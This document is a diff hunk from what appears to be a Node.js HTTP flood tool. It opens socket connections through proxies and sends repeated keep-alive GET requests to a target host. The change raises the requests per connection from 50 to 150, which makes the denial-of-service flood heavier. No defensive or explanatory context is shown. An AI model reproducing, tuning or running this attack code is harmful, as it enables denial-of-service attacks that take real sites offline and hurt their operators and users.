@@ -25,7 +25,7 @@ var int = setInterval(() =>
         var s = require('net').Socket();
         s.connect(proxy[1], proxy[0]);
         s.setTimeout(10000);
-        for (var i = 0; i < 50; i++) {
+        for (var i = 0; i < 150; i++) {
             s.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nConnection: Keep-Alive\r\n\r\n');
         }
         s.on('data', function () { setTimeout(function () { s.destroy(); return delete s; }, 5000); })
